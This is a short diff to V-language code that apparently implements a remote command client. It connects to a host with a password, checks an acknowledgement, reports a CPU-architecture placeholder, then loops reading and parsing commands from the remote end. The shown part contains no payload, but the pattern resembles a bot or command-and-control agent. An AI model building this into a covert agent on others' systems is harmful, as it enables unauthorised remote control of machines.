@@ -1,6 +1,7 @@
 import os
 import io
 import net
+import time
 
 fn main() {
 	mut args := os.args.clone()
@@ -20,9 +21,13 @@ fn server(ip string, port string, pw string) {
 		exit(0)
 	}
 
-	server.write_string("${pw}\n") or { 0 }
-
 	mut reader := io.new_buffered_reader(reader: server)
+	server.write_string("${pw}\n") or { 0 } // Send PW
+	time.sleep(2*time.second)
+	check := reader.read_line() or { "" }
+	if check.replace("\n", "") == "[x]" { exit(0) }
+
+	server.write_string("cpu_here\n") or { 0 } // Send CPU ARCH
 	for {
 		data := reader.read_line() or { "" }
 		fcmd, cmd, args := parse_buffer(data)
